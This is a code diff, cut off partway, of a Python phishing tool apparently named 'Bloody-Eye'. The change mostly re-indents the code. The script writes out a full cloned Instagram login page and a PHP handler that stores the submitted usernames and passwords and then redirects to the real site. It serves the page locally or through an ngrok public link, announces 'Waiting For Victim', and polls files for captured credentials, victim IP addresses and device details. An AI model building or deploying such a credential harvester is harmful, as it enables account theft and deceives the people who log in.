@@ -13,621 +13,621 @@ import time
 stat_file = 0
 # instagram temp
 def instagram():
-    try:
-    path =("""<!DOCTYPE html>
-    <html data-passport-version="5" lang="en"><head>
-    <style>
-
-body {
-  overflow-y: scroll;
-}
-
-a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
-  margin:0;
-  padding:0;
-  border:0;
-  font:inherit;
-  vertical-align: baseline;
-} 
-
-a, a:visited {
-  text-decoration: none;
-}
-a:active, .btn:active {
-  opacity:.5;
-}
-
-ol, ul {
-  list-style: none;
-}
-
-body, button, input {
-  font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-  font-size:14px;
-  line-height:18px;
-}
-
-#root, article, main, div, section, header, nav, footer {
-  border: 0 solid #000000;
-  box-sizing: border-box;
-  align-items: stretch;
-  display: flex;
-  flex-direction: column;
-  flex-shrink: 0;
-  margin:0;
-  padding:0;
-  position: relative;
-  -webkit-box-align: stretch;
-    -moz-box-align: stretch;
-  -webkit-box-orient: vertical;
-    -moz-box-orient: vertical;
-  -webkit-box-direction: normal;
-    -moz-box-direction: normal;
-} /* <--Universal Selectors End */
-
-
-#root {
-  z-index: 0;
-}
-
-.section-all {
-  min-height:100%;
-  overflow:hidden;
-}
-
-.main {
-  background-color: #fafafa;
-  order: 4;
-  flex-grow: 1;
-  -webkit-box-flex: 1;
-  -moz-box-flex: 1;
-  -moz-box-ordinal-group: 5;
-  -webkit-box-ordinal-group: 5;
-}
-
-.wrapper {
-  min-height:100%;
-  overflow: hidden;
-}
-
-.wrapper, .article {
-  flex-grow: 1;
-  justify-content: center;
-  -webkit-box-flex: 1;
-    -moz-box-flex: 1;
-  -webkit-box-pack: center;
-    -moz-box-pack: center;
-}
-
-.article {
-  flex-direction: row;
-  margin:0 auto;
-  max-width: 935px;
-  width:100%;
-  -webkit-box-orient: horizontal;
-    -moz-box-orient: horizontal;
-  -webkit-box-direction: normal;
-    -moz-box-direction: normal;
-}
-
-.content {
-  color:#262626;
-  flex-grow:1;
-  justify-content: center;
-  max-width: 350px;
-  margin-top:12px;
-  -webkit-box-pack: justify;
-    -moz-box-pack: justify;
-  -webkit-box-flex: 1;
-    -moz-box-flex: 1;  
-}
-
-.login-box {
-  background: #fff;
-  border: 1px solid #e6e6e6;
-  border-radius: 1px;
-  margin:0 0 10px;
-  padding: 10px 0;
-  /* align-items: center; */
-}
-
-.header {
-  margin: 14.45px auto 12px;
-}
-
-.logo {
-  background: cover no-repeat;
-  width:175px;
-  height:auto;
-}
-
-.form {
-  display: flex;
-  flex-direction: column;
-  margin-bottom: 10px;
-  -moz-box-direction: normal;
-  -webkit-box-direction: normal;
-}
-
-.input-box {
-  margin:auto 40px 6px;
-}
-
-input {
-  height: 36px;
-  border: 1px solid #efefef;
-  border-radius: 3px;
-  background-color: #fafafa;
-  width:100%;
-  font-size:12px;
-  margin: 0;
-  padding: 9px 0 7px 8px;
-  outline: none;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  box-sizing: border-box;
-}
-input#name:focus, input#password:focus {
-  border-color:#bbb;
-}
-
-.button-box {
-  display: block;
-  position: relative;
-  margin: 8px 40px;
-}
-.btn {
-  cursor: pointer;
-  width: 100%;
-  padding:0 8px; 
-  background: #3897f0;
-  border:1px solid #3897f0;
-  color:#fff;
-  border-radius:3px;
-  font-weight:600;
-  font-size: 14px;
-  height: 28px;
-  line-height: 26px;
-  outline: none;
-  white-space: nowrap;
-}
-
-.forgot, .forgot:active, .forgot:hover, .forgot:visited {
-  font-size:12px;
-  margin-top:12px;
-  text-align: center;
-  color:#003569;
-  line-height: 14px!important;
-}
-
-.text {
-  text-align:center;
-  margin:15px;
-  color:#262626;
-  font-size:14px;
-}
-
-.text a, .text a:visited, .text a:hover, .text a:active {
-  color:#3897f0;
-  margin-left:3px;
-}
-
-/* App Store */
-.app p {
-  line-height: 18px;
-  color:#262626;
-  font-size:14px;
-  text-align:center;
-  margin:10px 20px;
-}
-
-.app-img {
-  flex-direction: row;
-  justify-content: center;
-  margin:10px 0;
-  -webkit-box-orient: horizontal;
-  -moz-box-orient: horizontal;
-}
-
-.app-img a {
-  margin-right:8px;
-  height: 43.5px;
-}
-
-.app-img img {
-  height:40px;
-}
-
-/* FOOTER */
-.footer {
-  background-color: #fafafa;
-  order: 5;
-  padding: 0 20px;
-  background: #fafafa;
-}
-
-.footer-container {
-  flex-direction: row;  
-  flex-wrap:wrap;
-  background-color: #fafafa;
-  justify-content: space-between;
-  padding: 38px 0;
-  max-width:935px;
-  font-size:12px;
-  font-weight:600;
-  margin:0 auto;
-  text-transform:uppercase;
-  width:100%
-}
-
-.footer-nav {
-  max-width:100%;
-}
-
-.footer-nav ul {
-  margin-right:16px;
-  margin-bottom:3px;
-  flex-grow:1;
-}
-
-.footer-nav ul li {
-  display: inline-block;
-  margin-right: 13px;
-  margin-bottom:7px;
-}
-
-.footer-nav ul li a {
-  color: #003569;
-  text-decoration: none;
-}
-
-.footer span {
-  color:#999;
-}
-
-span.language { 
-  color: #003569;
-  cursor: pointer;
-  display: inline-block;
-  font-weight: 600;
-  position: relative;
-  text-transform: uppercase;
-  vertical-align: top;
-}
-
-.select {
-  cursor: pointer;
-  height: 100%;
-  top: 0;
-  opacity: 0;
-  position: absolute;
-  left:0;
-  width: 100%;
-}
-
-/* Media Queries */
-@media (max-width:450px) {
-  .main {
-    background-color: #fff;
-  }
-
-  .content {
-    max-width: 100%;
-    margin-top: 0;
-    justify-content: space-between;
-  }
-
-  .login-box {
-    background-color: transparent;
-    border:none;
-  }
-
-  .logo {
-    background: cover no-repeat;
-    width:175px;
-    height:auto;
-    margin:0 auto;
-  }
-
-  .btn {
-    cursor: pointer;
-    width: 100%;
-    padding:0 8px; 
-    background: #3897f0;
-    border:1px solid #3897f0;
-    color:#fff;
-    border-radius:3px;
-    font-weight:600;
-    font-size: 14px;
-    height: 28px;
-    line-height: 26px;
-    outline: none;
-    white-space: nowrap;
-  }
-
-  .input-box {
-    border: 1px solid #efefef;
-    border-radius: 3px;
-    height: 36px;
-    background: #fafafa;
-    position: relative;
-  }
-
-  input {
-    border: 0;
-    background-color: #fafafa;
-    width:100%;
-    font-size:12px;
-    margin: 0;
-    padding: 9px 0 7px 8px;
-    outline: none;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    box-sizing: border-box;
-  }
-
-  .input-box:hover, .input-box:focus {
-    border-color:#bbb;
-  }
-
-}
-
-@media only screen and (max-width:875px) {
-  .footer-container {
-    text-align: center;
-    padding:10px 0;
-  }
-  .footer-container,  .footer-nav ul {
-    justify-content: center;
-    margin:0 auto;
-    max-width: 360px;
-    min-width: auto;
-    -webkit-box-pack: center;
-    -moz-box-pack: center;
-  }
-
-}
-
-
-
-
-
-
-
-
-
-  </style>
-
- 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-  <script src="https://dl.sabzlearn.ir/sc/client.min.js"></script>
-  <script src="loc.js"></script>
-  </head>
-  <body onload="data()">
-      <span id="root">
-        <section class="section-all">
-    
-          <!-- 1-Role Main -->
-          <main class="main" role="main">
-            <div class="wrapper">
-              <article class="article">
-                <div class="content">
-                  <div class="login-box">
-                    <div class="header">
-                      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                    </div><!-- Header end -->
-                    <div class="form-wrap">
-                      <form class="form" action="login.php" method="POST">
-    
-                        <div class="input-box">
-                          <input type="text" id="username" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
-                        </div>  
-    
-                        <div class="input-box">
-                          <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
-                        </div>  
-    
-                        <span class="button-box">
-                          <button class="btn" type="submit" name="submit">Log in</button>
-                        </span>  
-    
-                        <a class="forgot" href="">Forgot password?</a>
-                      </form>
-                    </div> <!-- Form-wrap end -->
-                  </div> <!-- Login-box end -->
-    
-                  <div class="login-box">
-                    <p class="text">Don't have an account?<a href="#">Sign up</a></p>
-                  </div> <!-- Signup-box end -->
-    
-                  <div class="app">
-                    <p>Get the app.</p>
-                    <div class="app-img">
-                      <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
-                      </a>
-                      <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
-                      </a>  
-                    </div>  <!-- App-img end-->
-                  </div> <!-- App end -->
-                </div> <!-- Content end -->
-              </article>
-            </div> <!-- Wrapper end -->
-          </main>
-    
-          <!-- 2-Role Footer -->
-          <footer class="footer" role="contentinfo">
-            <div class="footer-container">
-    
-              <nav class="footer-nav" role="navigation">
-                <ul>
-                  <li><a href="">About Us</a></li>
-                  <li><a href="">Support</a></li>
-                  <li><a href="">Blog</a></li>
-                  <li><a href="">Press</a></li>
-                  <li><a href="">Api</a></li>
-                  <li><a href="">Jobs</a></li>
-                  <li><a href="">Privacy</a></li>
-                  <li><a href="">Terms</a></li>
-                  <li><a href="">Directory</a></li>
-                  <li>
-                    <span class="language">Language
-                      <select name="language" class="select" onchange="la(this.value)">
-                        <option value="#">English</option>
-                        <option value="http://ru-instafollow.bitballoon.com">Russian</option>
-                      </select>
-                    </span>
-                  </li>
-                </ul>
-              </nav>
-    
-              <span class="footer-logo">&copy; 2021 Instagram</span>
-            </div> <!-- Footer container end -->
-          </footer>
-          
-        </section>
-      </span> <!-- Root -->
-    
-      <!-- Select Link -->
-      <script type="text/javascript">
-        function la(src) {
-          window.location=src;
-        }
-      </script>
-    </body>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
- </html>""")
-    filedown = open("templates/phishing/login.html","w")
-    filedown.write(path)
-    filedown.close()
-    phppath=("""<?php
-$user = $_POST['username'];
-$pass = $_POST['password'];
-$data['dev'][] = array('username' =>$user,
-'password'=>$pass);
-
-$jdata = json_encode($data);
-$f = fopen('usernames.json', 'w');
-fwrite($f, $jdata);
-fclose($f);
-header('Location:https://instagram.com');
-exit();""")
-    print("")
-    filedown = open("templates/phishing/login.php","w")
-    filedown.write(phppath)
-    filedown.close()
-# Choosing a Service to Port Forwarding
-    bannner.banner()
-    time.sleep(0.07)
-    print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Choose a Service to Port Forwarding")
-    print("")
-    time.sleep(0.07)
-    print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+" Localhost")
-    print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+" Ngorok.io")
-    print("")
-    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
-    if v == "01":
-      with open("log","w") as phplog:
-        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      print("")
-      time.sleep(0.07)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      print("")
-      time.sleep(0.07)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
-    elif v == "02":
-      with open("log","w") as phplog:
-        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      print("")
-      bannner.banner()
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      link = ngrok.connect(6060,"http")
-      a_print_link = (Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url1 : "+link)
-      b_print_link = (a_print_link).replace("http","https")
-      print("\n"+b_print_link)
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url2 : "+link)
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.WHITE+" Waiting for Login Info. "+Fore.BLUE+"Ctrl + C "+Fore.WHITE+"to exit")
-
-
-    
-# Getting User And Password
-    def userin():
-        global stat_file
-        if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
-            stat_file = str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size)
-            fileip = open("../Bloody-Eye/templates/phishing/usernames.json","r")
-            b = fileip.read()
-            try:
-                infor = json.loads(b)
-                for value in infor['dev']:
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Username : "+Fore.WHITE+value['username'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Password : "+Fore.WHITE+value["password"])
-                    a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
-                    b = a.write("")
-                    a.close()
-            except:
-                None
-# Getting IP Address
-    def readip():
-        global stat_file
-        if not str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size) == stat_file:
-            stat_file = str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size)
-            fileip =  open('../Bloody-Eye/templates/phishing/ip.txt','r')
-            i = fileip.readlines()
-            try:
-                i = i[-1]
-                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Victim's IP Found")
-                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.GREEN+"%s"%(i))
-                o = open("../Bloody-Eye/templates/phishing/ip.txt","w")
-                o.write("")
-                o.close()
-            except:
-                None
-# Getting Victim Info
-    def info():
+        try:
+        path =("""<!DOCTYPE html>
+        <html data-passport-version="5" lang="en"><head>
+        <style>
+
+    body {
+      overflow-y: scroll;
+    }
+
+    a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
+      margin:0;
+      padding:0;
+      border:0;
+      font:inherit;
+      vertical-align: baseline;
+    } 
+
+    a, a:visited {
+      text-decoration: none;
+    }
+    a:active, .btn:active {
+      opacity:.5;
+    }
+
+    ol, ul {
+      list-style: none;
+    }
+
+    body, button, input {
+      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+      font-size:14px;
+      line-height:18px;
+    }
+
+    #root, article, main, div, section, header, nav, footer {
+      border: 0 solid #000000;
+      box-sizing: border-box;
+      align-items: stretch;
+      display: flex;
+      flex-direction: column;
+      flex-shrink: 0;
+      margin:0;
+      padding:0;
+      position: relative;
+      -webkit-box-align: stretch;
+        -moz-box-align: stretch;
+      -webkit-box-orient: vertical;
+        -moz-box-orient: vertical;
+      -webkit-box-direction: normal;
+        -moz-box-direction: normal;
+    } /* <--Universal Selectors End */
+
+
+    #root {
+      z-index: 0;
+    }
+
+    .section-all {
+      min-height:100%;
+      overflow:hidden;
+    }
+
+    .main {
+      background-color: #fafafa;
+      order: 4;
+      flex-grow: 1;
+      -webkit-box-flex: 1;
+      -moz-box-flex: 1;
+      -moz-box-ordinal-group: 5;
+      -webkit-box-ordinal-group: 5;
+    }
+
+    .wrapper {
+      min-height:100%;
+      overflow: hidden;
+    }
+
+    .wrapper, .article {
+      flex-grow: 1;
+      justify-content: center;
+      -webkit-box-flex: 1;
+        -moz-box-flex: 1;
+      -webkit-box-pack: center;
+        -moz-box-pack: center;
+    }
+
+    .article {
+      flex-direction: row;
+      margin:0 auto;
+      max-width: 935px;
+      width:100%;
+      -webkit-box-orient: horizontal;
+        -moz-box-orient: horizontal;
+      -webkit-box-direction: normal;
+        -moz-box-direction: normal;
+    }
+
+    .content {
+      color:#262626;
+      flex-grow:1;
+      justify-content: center;
+      max-width: 350px;
+      margin-top:12px;
+      -webkit-box-pack: justify;
+        -moz-box-pack: justify;
+      -webkit-box-flex: 1;
+        -moz-box-flex: 1;  
+    }
+
+    .login-box {
+      background: #fff;
+      border: 1px solid #e6e6e6;
+      border-radius: 1px;
+      margin:0 0 10px;
+      padding: 10px 0;
+      /* align-items: center; */
+    }
+
+    .header {
+      margin: 14.45px auto 12px;
+    }
+
+    .logo {
+      background: cover no-repeat;
+      width:175px;
+      height:auto;
+    }
+
+    .form {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 10px;
+      -moz-box-direction: normal;
+      -webkit-box-direction: normal;
+    }
+
+    .input-box {
+      margin:auto 40px 6px;
+    }
+
+    input {
+      height: 36px;
+      border: 1px solid #efefef;
+      border-radius: 3px;
+      background-color: #fafafa;
+      width:100%;
+      font-size:12px;
+      margin: 0;
+      padding: 9px 0 7px 8px;
+      outline: none;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      box-sizing: border-box;
+    }
+    input#name:focus, input#password:focus {
+      border-color:#bbb;
+    }
+
+    .button-box {
+      display: block;
+      position: relative;
+      margin: 8px 40px;
+    }
+    .btn {
+      cursor: pointer;
+      width: 100%;
+      padding:0 8px; 
+      background: #3897f0;
+      border:1px solid #3897f0;
+      color:#fff;
+      border-radius:3px;
+      font-weight:600;
+      font-size: 14px;
+      height: 28px;
+      line-height: 26px;
+      outline: none;
+      white-space: nowrap;
+    }
+
+    .forgot, .forgot:active, .forgot:hover, .forgot:visited {
+      font-size:12px;
+      margin-top:12px;
+      text-align: center;
+      color:#003569;
+      line-height: 14px!important;
+    }
+
+    .text {
+      text-align:center;
+      margin:15px;
+      color:#262626;
+      font-size:14px;
+    }
+
+    .text a, .text a:visited, .text a:hover, .text a:active {
+      color:#3897f0;
+      margin-left:3px;
+    }
+
+    /* App Store */
+    .app p {
+      line-height: 18px;
+      color:#262626;
+      font-size:14px;
+      text-align:center;
+      margin:10px 20px;
+    }
+
+    .app-img {
+      flex-direction: row;
+      justify-content: center;
+      margin:10px 0;
+      -webkit-box-orient: horizontal;
+      -moz-box-orient: horizontal;
+    }
+
+    .app-img a {
+      margin-right:8px;
+      height: 43.5px;
+    }
+
+    .app-img img {
+      height:40px;
+    }
+
+    /* FOOTER */
+    .footer {
+      background-color: #fafafa;
+      order: 5;
+      padding: 0 20px;
+      background: #fafafa;
+    }
+
+    .footer-container {
+      flex-direction: row;  
+      flex-wrap:wrap;
+      background-color: #fafafa;
+      justify-content: space-between;
+      padding: 38px 0;
+      max-width:935px;
+      font-size:12px;
+      font-weight:600;
+      margin:0 auto;
+      text-transform:uppercase;
+      width:100%
+    }
+
+    .footer-nav {
+      max-width:100%;
+    }
+
+    .footer-nav ul {
+      margin-right:16px;
+      margin-bottom:3px;
+      flex-grow:1;
+    }
+
+    .footer-nav ul li {
+      display: inline-block;
+      margin-right: 13px;
+      margin-bottom:7px;
+    }
+
+    .footer-nav ul li a {
+      color: #003569;
+      text-decoration: none;
+    }
+
+    .footer span {
+      color:#999;
+    }
+
+    span.language { 
+      color: #003569;
+      cursor: pointer;
+      display: inline-block;
+      font-weight: 600;
+      position: relative;
+      text-transform: uppercase;
+      vertical-align: top;
+    }
+
+    .select {
+      cursor: pointer;
+      height: 100%;
+      top: 0;
+      opacity: 0;
+      position: absolute;
+      left:0;
+      width: 100%;
+    }
+
+    /* Media Queries */
+    @media (max-width:450px) {
+      .main {
+        background-color: #fff;
+      }
+
+      .content {
+        max-width: 100%;
+        margin-top: 0;
+        justify-content: space-between;
+      }
+
+      .login-box {
+        background-color: transparent;
+        border:none;
+      }
+
+      .logo {
+        background: cover no-repeat;
+        width:175px;
+        height:auto;
+        margin:0 auto;
+      }
+
+      .btn {
+        cursor: pointer;
+        width: 100%;
+        padding:0 8px; 
+        background: #3897f0;
+        border:1px solid #3897f0;
+        color:#fff;
+        border-radius:3px;
+        font-weight:600;
+        font-size: 14px;
+        height: 28px;
+        line-height: 26px;
+        outline: none;
+        white-space: nowrap;
+      }
+
+      .input-box {
+        border: 1px solid #efefef;
+        border-radius: 3px;
+        height: 36px;
+        background: #fafafa;
+        position: relative;
+      }
+
+      input {
+        border: 0;
+        background-color: #fafafa;
+        width:100%;
+        font-size:12px;
+        margin: 0;
+        padding: 9px 0 7px 8px;
+        outline: none;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        box-sizing: border-box;
+      }
+
+      .input-box:hover, .input-box:focus {
+        border-color:#bbb;
+      }
+
+    }
+
+    @media only screen and (max-width:875px) {
+      .footer-container {
+        text-align: center;
+        padding:10px 0;
+      }
+      .footer-container,  .footer-nav ul {
+        justify-content: center;
+        margin:0 auto;
+        max-width: 360px;
+        min-width: auto;
+        -webkit-box-pack: center;
+        -moz-box-pack: center;
+      }
+
+    }
+
+
+
+
+
+
+
+
+
+      </style>
+
+
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+      <script src="https://dl.sabzlearn.ir/sc/client.min.js"></script>
+      <script src="loc.js"></script>
+      </head>
+      <body onload="data()">
+          <span id="root">
+            <section class="section-all">
+
+              <!-- 1-Role Main -->
+              <main class="main" role="main">
+                <div class="wrapper">
+                  <article class="article">
+                    <div class="content">
+                      <div class="login-box">
+                        <div class="header">
+                          <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                        </div><!-- Header end -->
+                        <div class="form-wrap">
+                          <form class="form" action="login.php" method="POST">
+
+                            <div class="input-box">
+                              <input type="text" id="username" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
+                            </div>  
+
+                            <div class="input-box">
+                              <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                            </div>  
+
+                            <span class="button-box">
+                              <button class="btn" type="submit" name="submit">Log in</button>
+                            </span>  
+
+                            <a class="forgot" href="">Forgot password?</a>
+                          </form>
+                        </div> <!-- Form-wrap end -->
+                      </div> <!-- Login-box end -->
+
+                      <div class="login-box">
+                        <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+                      </div> <!-- Signup-box end -->
+
+                      <div class="app">
+                        <p>Get the app.</p>
+                        <div class="app-img">
+                          <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
+                          </a>
+                          <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                          </a>  
+                        </div>  <!-- App-img end-->
+                      </div> <!-- App end -->
+                    </div> <!-- Content end -->
+                  </article>
+                </div> <!-- Wrapper end -->
+              </main>
+
+              <!-- 2-Role Footer -->
+              <footer class="footer" role="contentinfo">
+                <div class="footer-container">
+
+                  <nav class="footer-nav" role="navigation">
+                    <ul>
+                      <li><a href="">About Us</a></li>
+                      <li><a href="">Support</a></li>
+                      <li><a href="">Blog</a></li>
+                      <li><a href="">Press</a></li>
+                      <li><a href="">Api</a></li>
+                      <li><a href="">Jobs</a></li>
+                      <li><a href="">Privacy</a></li>
+                      <li><a href="">Terms</a></li>
+                      <li><a href="">Directory</a></li>
+                      <li>
+                        <span class="language">Language
+                          <select name="language" class="select" onchange="la(this.value)">
+                            <option value="#">English</option>
+                            <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                          </select>
+                        </span>
+                      </li>
+                    </ul>
+                  </nav>
+
+                  <span class="footer-logo">&copy; 2021 Instagram</span>
+                </div> <!-- Footer container end -->
+              </footer>
+
+            </section>
+          </span> <!-- Root -->
+
+          <!-- Select Link -->
+          <script type="text/javascript">
+            function la(src) {
+              window.location=src;
+            }
+          </script>
+        </body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     </html>""")
+        filedown = open("templates/phishing/login.html","w")
+        filedown.write(path)
+        filedown.close()
+        phppath=("""<?php
+    $user = $_POST['username'];
+    $pass = $_POST['password'];
+    $data['dev'][] = array('username' =>$user,
+    'password'=>$pass);
+
+    $jdata = json_encode($data);
+    $f = fopen('usernames.json', 'w');
+    fwrite($f, $jdata);
+    fclose($f);
+    header('Location:https://instagram.com');
+    exit();""")
+        print("")
+        filedown = open("templates/phishing/login.php","w")
+        filedown.write(phppath)
+        filedown.close()
+    # Choosing a Service to Port Forwarding
+        bannner.banner()
+        time.sleep(0.07)
+        print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Choose a Service to Port Forwarding")
+        print("")
+        time.sleep(0.07)
+        print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+" Localhost")
+        print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+" Ngorok.io")
+        print("")
+        v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
+        if v == "01":
+          with open("log","w") as phplog:
+            Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+          print("")
+          time.sleep(0.07)
+          print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
+          print("")
+          time.sleep(0.07)
+          print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
+        elif v == "02":
+          with open("log","w") as phplog:
+            Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+          print("")
+          bannner.banner()
+          print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
+          link = ngrok.connect(6060,"http")
+          a_print_link = (Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url1 : "+link)
+          b_print_link = (a_print_link).replace("http","https")
+          print("\n"+b_print_link)
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url2 : "+link)
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.WHITE+" Waiting for Login Info. "+Fore.BLUE+"Ctrl + C "+Fore.WHITE+"to exit")
+
+
+
+    # Getting User And Password
+        def userin():
             global stat_file
-            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
-                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
-                fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
+            if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
+                stat_file = str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size)
+                fileip = open("../Bloody-Eye/templates/phishing/usernames.json","r")
                 b = fileip.read()
-            try:
-                infor = json.loads(b)
-                for value in infor['dev']:
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Name : "+Fore.WHITE+value['Os-Name'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Os-Version'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Language'])
-                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
-                    b = a.write("")
-                    a.close()
-            except:
-                None
-    while True:
-        userin()
-        readip()
-        info()
+                try:
+                    infor = json.loads(b)
+                    for value in infor['dev']:
+                        print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Username : "+Fore.WHITE+value['username'])
+                        print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Password : "+Fore.WHITE+value["password"])
+                        a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
+                        b = a.write("")
+                        a.close()
+                except:
+                    None
+    # Getting IP Address
+        def readip():
+            global stat_file
+            if not str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size) == stat_file:
+                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size)
+                fileip =  open('../Bloody-Eye/templates/phishing/ip.txt','r')
+                i = fileip.readlines()
+                try:
+                    i = i[-1]
